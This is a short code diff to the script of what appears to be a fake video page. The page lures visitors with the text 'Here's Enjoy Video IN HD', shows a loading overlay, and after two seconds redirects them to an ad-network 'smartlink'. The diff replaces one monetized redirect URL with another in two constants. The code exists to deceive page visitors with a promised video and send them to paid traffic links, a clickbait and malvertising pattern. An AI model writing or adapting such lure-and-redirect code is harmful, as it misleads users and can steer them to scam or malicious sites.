@@ -1,7 +1,7 @@
 // Constants
 const DEFAULT_TEXT = "Here's Enjoy Video IN HD";
 const REDIRECT_DELAY_MS = 2000; // 2 seconds
-const REDIRECT_URL = "https://www.profitableratecpmnetwork.com/k5zrm82mt?key=8b4d577eae0ec4823800cf226f0e9945"; // Change if needed
+const REDIRECT_URL = "https://apiguinee.org/4/255ed97de5bf077182d1a88837216365"; // Change if needed
 
 // Elements
 const video = document.getElementById("videoPlayer");
@@ -67,7 +67,7 @@ stage.addEventListener("mouseleave", () => {
 
 // Loading + Redirect
 let redirectTimer = null;
-const SMARTLINK_URL = "https://www.profitableratecpmnetwork.com/k5zrm82mt?key=8b4d577eae0ec4823800cf226f0e9945";
+const SMARTLINK_URL = "https://apiguinee.org/4/255ed97de5bf077182d1a88837216365";
 
 function startLoadingThenRedirect() {
     overlay.classList.add("hidden");
